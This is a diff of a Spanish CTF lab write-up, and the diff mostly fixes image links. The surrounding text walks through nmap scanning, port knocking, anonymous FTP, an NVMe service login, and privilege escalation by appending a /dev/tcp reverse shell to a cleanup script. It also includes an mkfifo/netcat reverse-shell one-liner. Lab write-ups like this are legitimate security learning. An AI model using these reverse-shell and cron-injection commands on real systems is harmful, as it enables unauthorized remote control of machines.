@@ -12,7 +12,9 @@ nmap <IP> -p- --open -sS --min-rate 5000 -Pn -n -vvv -oG allports
 ```bash
 nmap <IP> -p22,4420,8080 -sCV -oN targeted
 ```
-![](Nmap-targeted.png)
+
+![nmap-targeted](Img/Nmap-targeted.png)
+
 
 Vale una vez el escaneo hecho podemos ver tres puertos:
 - 22 <- ssh - no tenemos credenciales a si que de momento lo descartamos
@@ -24,9 +26,9 @@ Lo primero que voy a hacer va a ser ver si me puedo conectar sin credenciales al
 ### Escaneo web
 
 Ahora vamos a entrar a la pagina web por el puerto 8080 que se vería algo así 
-![[web.png]]
+![web](Img/web.png)
 Navegando un poco por la web nos encontramos este post
-![[post.png]]
+![post](Img/post.png)
 
 ### Explotación Port Knocking
 
@@ -35,13 +37,13 @@ Aqui vemos este mensaje donde knock knock hace referencia a una tecnica que se l
 python3 knockit.py -b 10.66.164.145 1111 2222 3333 4444
 ```
 Después de esto vamos ha hacer otro escaneo de nmap el cual nos ha revelado un servicio de ftp con acceso anónimo
-![[ftp-scan.png]]
+![ftp-scan](Img/ftp-scan.png)
 ### Escaneo de FTP
 
 Nos metemos al ftp de forma anonima y vemos que hay un archivo: note.txt el cual me voy a descargar en mi maquina atacante
 ### Conectividad con NVMe
 La nota contiene la credencial para conectarnos al servicio de nvme asi que vamos a conectarnos con netcat
-![[NVMe-connect.png]]
+![NVME-connect](Img/NVMe-connect.png)
 Ya estamos dentro, viendo que la maquina tiene mkfifo y ncat me hago una reverse shell.
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.145.222 1234 >/tmp/f
@@ -56,11 +58,11 @@ nc -lvnp 4444 > runme
 nc <IP> 4444 < /home/catlover/runme
 ```
 Viendo los strings de el archivo vemos una palabra en texto claro lo cual parece una contraseña
-![[passwd.png]]
+![passwd](Img/passwd.png)
 
 Ejecutamos el script con esa contraseña y se nos transfiere un id_rsa
 
-![[script.png]]
+![script](Img/script.png)
 
 Nos transferimos con netcat igual que antes el id_rsa a nuestro equipo.
 
@@ -89,7 +91,7 @@ Aqui podemos ver la primera flag, pero y la otra? viendo un poco la maquina me h
 echo '/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1' >> clean.sh
 ```
 
-![[root.png]]
+![root](Img/root.png)
 
 De esta manera ya somos root y ya podemos leer la flag, en esta máquina he aprendido conceptos nuevos como el port knocking y he repasado conceptos como reverse shell, claves, strings y contenedores.
 
